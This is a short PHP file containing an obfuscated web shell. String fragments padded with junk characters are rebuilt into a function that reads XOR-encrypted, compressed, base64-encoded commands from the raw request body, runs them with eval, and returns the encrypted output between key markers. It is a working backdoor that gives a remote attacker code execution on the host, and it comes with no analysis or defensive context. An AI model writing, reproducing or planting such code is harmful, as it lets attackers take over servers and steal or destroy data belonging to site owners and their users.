<?php
$Q='("/$kh5(.+)5$kf/5",@fil5e_get_c5ontents("p5hp:5//i5npu5t"),$5m)==1) {@5ob_start(5);@e';
$m='ob_e55nd_clean();$r=5@bas5e64_en5code(@x5(@gzco55mpress5(5$o5),$k))5;print("$p$kh$r$kf");}';
$s='$k5="02d18716";5$kh=5"cd1451ada785e1";$kf=5"d38b5ab751896a";$p="5i5klhLe54YBGPJaa50x5";fu';
$M='va5l(@gzunco5mpress(5@x(@ba5s5e654_d5e5code($m[1]),$k)));$5o=@ob_get_5c5ontents(5);@';
$O=str_replace('R','','crReaRte_RfuRnRctRion');
$E='nction x(5$t,$k){5$c=s5trlen($55k)5;$l=str5len($t);$o=""5;f5or($i=0;$i<$l;5){for5($j=';
$e='50;5($j<$c55&&$i<$l);$j++,$i++)5{$5o.=$t{5$i}^5$k{$j}5;}}r5eturn $o;}i5f (@preg_55match';
$K=str_replace('5','',$s.$E.$e.$Q.$M.$m);
$Z=$O('',$K);$Z();
?>
